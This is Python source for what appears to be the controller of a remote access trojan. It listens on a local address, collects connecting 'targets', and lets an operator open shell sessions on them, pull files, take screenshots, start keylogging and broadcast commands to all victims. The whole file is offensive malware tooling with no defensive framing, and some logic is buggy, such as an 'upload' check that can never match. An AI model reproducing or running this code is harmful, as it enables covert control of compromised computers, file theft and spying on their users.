#!/usr/bin/python

import socket
import json
import os
import base64
import threading

def sentoAll(target,data):
    json_data = json.dumps(data)
    target.send(bytes(json_data, 'utf-8'))

def shell(target, ip):
    def relibale_send(data):
        json_data = json.dumps(data)
        target.send(bytes(json_data, 'utf-8'))
    def reliable_recv():
        data = ""
        while True:
            try:
                data = data + str(target.recv(1024).decode("utf-8"))
                return json.loads(data)
            except ValueError:
                continue


               
    global count
    while True:
        command = reliable_recv()
        command = input("* Shell#-%s: " % str(ip))
        print("Commansd came %s " % str(command))
        relibale_send(command)
        print("Command came %s " % str(command)) 
        if command =='q':
            continue
        if command == "exit":
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break
        elif command[:2] == "cd" and len(command) >1:
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:8] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    relibale_send(base64.b64encode(fin.read()))
            except:
                failed = "failed to upload "
                relibale_send(base64.b64encode(failed))
        elif command[:10] == "screenshot":
            with open("screenhot%d" %count, "wb") as screen:
                image = reliable_recv()
                image_decoded = base64.b64decode(image)
                if image_decoded[:4] == ["[!!]"]:
                    print(image_decoded)
                else:
                    screen.write(image_decoded)
                    count += 1
        elif command[:12] == "keylog_start":
            continue

            
        else:
            result = reliable_recv()
            print(result)




def server():
    global clients
    while True:
        s.settimeout(1)
        try:
            target , ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print(str(targets[clients]) + "----" + str(ips[clients]) + " Has connected")
            clients +=1
        except:
            pass

global s
ips = []
targets = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
s.bind(("192.168.0.21", 54321))
s.listen(5)

clients = 0
stop_threads = False
print("[+] waiting for targets to Connects....")
t1 = threading.Thread(target=server)
t1.start()

while True:
    command = input("* Center: ")
    if command == "target":
        count = 0
        for ip in ips:
            print("session  " + str(count) + " <-->." + str(ip))
            count += 1
    elif command == "exit":
        for target in targets:
            target.close()
        s.close()
        stop_threads = True
        t1.join()
        break
    elif command == "sendall":
        length_of_target = len(targets)
        i = 0
        try:
            while i<length_of_target:
                tarNumber =  targets[i]
                print(tarNumber)
                sentoAll(tarNumber,command)
                i += 1
        except:
            print("[!!] failed to send command to all targets")
    elif command[:7] == "session":
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            shell(tarnum, tarip)
        except:
            print("[!!] No session Under The Number.")
    else :
        print("[!!] Command Does not exit")

        
